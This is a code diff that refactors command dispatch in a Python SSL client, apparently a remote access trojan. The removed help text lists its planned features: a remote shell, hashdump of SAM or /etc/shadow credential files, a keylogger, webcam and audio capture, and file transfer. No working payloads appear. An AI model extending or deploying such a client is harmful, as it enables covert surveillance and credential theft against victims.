@@ -1,6 +1,7 @@
 import socket
 import ssl
 from utils.logger import setup_logger
+from commands.command_registry import CommandRegistry
 
 # import subprocess
 
@@ -23,6 +24,7 @@ class SSLClient:
         self._context.load_cert_chain(client_cert, client_key)
         self._sock = None
         self._ssock = None
+        self.registry = CommandRegistry()
 
     def close(self):
         if self._ssock:
@@ -54,25 +56,18 @@ class SSLClient:
             return None
 
     def execute_command(self, command: str) -> str:
-        command = command.lower().strip()
-        if command == "help":
-            return (
-                "help: Prints all the possible commands\n"
-                "download: Gather files from client and send them to server\n"
-                "upload: Gather files from server and send them to client\n"
-                "shell: Opens an interactive shell/bash/cmd\n"
-                "ipconfig: Get the client's network configuration\n"
-                "screenshot: Take a screenshot of the client\n"
-                "search: Search for a file on the client's filesystem\n"
-                "hashdump: Get the SAM or /etc/shadow file based on the OS\n"
-                "keylogger: Log every key of the client\n"
-                "webcam_snapshot: Take a picture using the client's webcam\n"
-                "webcam_stream: Livestream the client's webcam\n"
-                "record_audio: Record the client's audio\n"
-            )
+        command = command.strip()
 
-        if command == "download":
-            return "Downloading..."
+        if not command:
+            return "Empty command"
 
+        parts = command.split(" ", 1)
+        cmd_name = parts[0].lower()
+        args = parts[1] if len(parts) > 1 else ""
+
+        handler = self.registry.get(cmd_name)
+
+        if handler:
+            return handler.execute(args)
         else:
-            return "This " "command " "is " "not " "implemented"
+            return "Command not implemented"
